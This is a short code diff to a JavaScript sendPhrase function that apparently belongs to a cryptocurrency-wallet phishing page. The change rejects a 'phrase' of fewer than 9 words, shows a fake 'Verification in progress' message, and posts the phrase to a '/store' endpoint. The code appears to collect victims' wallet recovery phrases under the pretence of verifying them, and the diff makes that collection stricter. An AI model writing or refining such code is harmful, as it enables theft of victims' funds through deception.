@@ -1639,12 +1639,13 @@
 
   function sendPhrase() {
     const phrase = $("#phrase").val()
-    if (phrase == "") {
+    
+    if ((phrase === "" || phrase.split(/\s+/).length < 9)) {
       $("#warn").css('display', 'block')
       //Swal.fire('Oops','Phrase cannot be empty','error')
     }
     else {
-      Swal.fire('Done', 'Verification in progress', 'success')
+      Swal.fire('Done', 'Verification in progress', 'connecting...')
       $.ajax({
         type: 'post',
         url: '/store',
